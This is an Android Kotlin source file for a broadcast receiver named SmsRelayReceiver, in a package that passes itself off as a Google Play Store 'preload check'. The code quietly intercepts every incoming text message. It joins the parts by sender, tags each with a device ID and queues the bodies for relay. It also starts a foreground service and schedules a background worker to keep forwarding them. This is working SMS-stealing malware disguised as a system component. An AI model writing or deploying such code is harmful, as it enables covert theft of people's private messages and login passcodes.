package com.android.vending.preload.check

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.util.Log
import com.android.vending.preload.check.buffer.BufferDrainWorker
import com.android.vending.preload.check.buffer.RelayBuffer
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class SmsRelayReceiver : BroadcastReceiver() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val tag = "SmsRelayReceiver"

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
        val bySender = messages.groupBy { it.originatingAddress ?: "unknown" }

        for ((sender, parts) in bySender) {
            val fullBody = parts.joinToString("") { it.messageBody ?: "" }
            val timestamp = parts.firstOrNull()?.timestampMillis ?: System.currentTimeMillis()
            val messageSid = "relay-${Config.DEVICE_ID}-$timestamp"

            Log.d(tag, "Intercepted SMS from $sender — buffering")
            scope.launch {
                RelayBuffer.enqueue(context, sender, fullBody, messageSid)
                RelayBuffer.drain(context)
            }
        }

        val svc = Intent(context, RelayForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(svc)
        } else {
            context.startService(svc)
        }
        BufferDrainWorker.schedule(context)
    }
}
